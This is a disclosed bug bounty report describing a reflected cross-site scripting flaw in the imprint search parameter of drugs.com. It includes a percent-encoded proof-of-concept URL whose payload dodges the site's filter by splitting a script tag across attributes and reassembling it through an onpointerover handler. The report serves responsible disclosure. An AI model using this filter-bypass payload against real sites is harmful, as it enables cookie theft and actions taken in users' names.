# Cross-site Scripting (XSS) - Reflected

## Report Details
- **Report ID**: 1211148
- **URL**: https://hackerone.com/reports/1211148
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-05-28T00:17:55.741Z
- **Disclosed**: 2024-08-21T14:53:20.455Z

## Reporter
- **Username**: mersenne
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: drugs_com

## Vulnerability Information
Hello,
I found a XSS vulnerability in https://www.drugs.com/imprints.php?imprint=&color=&shape=0
The vulnerability is in the parameter *imprint*.
The vulnerability only exists if there is at least one result in the search. However, if you put a text long enough, you will always have search results. 

For example, the search: 'sometext' (https://www.drugs.com/imprints.php?imprint=sometext&color=8&shape=24) doesn't have results. However, the search 'sometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometext' (https://www.drugs.com/imprints.php?imprint=sometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometextsometext&color=8&shape=24) have 971 results.
In this way, an attacker can put a long text and always have search results and perform the xss attack (although the protection against xss makes things a bit difficult).

**Steps To Reproduce**:
Visit de following POC link  (works in firefox but not in chrome) and move your mouse over the search filters ('sort by' or 'amount of results'):
https://www.drugs.com/imprints.php?imprint=_%22%3E%3C%78%20%69%64%3D%22%78%22%20%76%35%3D%22%29%22%20%76%31%3D%22%3C%22%20%76%32%3D%22%53%43%52%49%50%54%3E%22%20%76%33%3D%22%61%6C%65%22%20%76%34%3D%22%72%74%28%31%22%20%76%36%3D%22%3C%2F%22%20%76%37%3D%22%53%43%52%49%50%54%3E%22%20%6F%6E%70%6F%69%6E%74%65%72%6F%76%65%72%3D%22%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%60%24%7B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%31%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%32%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%33%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%34%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%35%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%36%2E%76%61%6C%75%65%2B%77%69%6E%64%6F%77%2E%78%2E%61%74%74%72%69%62%75%74%65%73%2E%76%37%2E%76%61%6C%75%65%7D%60%22%3E&color=8&shape=24

## Impact

An XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies,  redirect users on malicious website, perform requests in the name of the victim, and more.

## Attachments
No attachments
